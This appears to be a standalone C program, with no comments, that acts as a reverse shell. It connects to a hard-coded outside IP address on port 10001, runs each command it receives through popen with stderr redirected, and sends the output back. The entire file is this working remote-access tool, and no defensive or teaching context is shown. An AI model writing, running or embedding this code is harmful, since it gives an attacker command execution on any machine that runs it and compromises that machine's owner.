#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define PORT 10001

int main() {
	int client = socket(PF_INET, SOCK_STREAM, 0);
	struct sockaddr_in server_addr;

	if (client == -1) {
		exit(EXIT_FAILURE);
	}

	memset(&server_addr, 0, sizeof(server_addr));
	server_addr.sin_family = AF_INET;
	server_addr.sin_addr.s_addr = inet_addr("40.78.16.217");
	server_addr.sin_port = htons(PORT);

	if (connect(client, &server_addr, sizeof(server_addr)) == -1) {
		exit(EXIT_FAILURE);
	}

	int rfd[2], wfd[2];

	if (pipe(rfd)==-1 || pipe(wfd)==-1) {
		exit(EXIT_FAILURE);
	}

	char buf[0x4000];
	ssize_t r;
	FILE *proc;

	while (1) {
		r = read(client, buf, 0x400);

		if (!strcmp(buf, "exit")) {
			break;
		}

		*(uint64_t *)(buf+r-1) = 0x31263E3220uLL;
		proc = popen(buf, "r");
		r = fread(buf, 1, 0x4000, proc);
		pclose(proc);

		write(client, buf, r);
	}

	read(0, buf, 0x1000);
	write(1, buf, strlen(buf));

	return 0;
}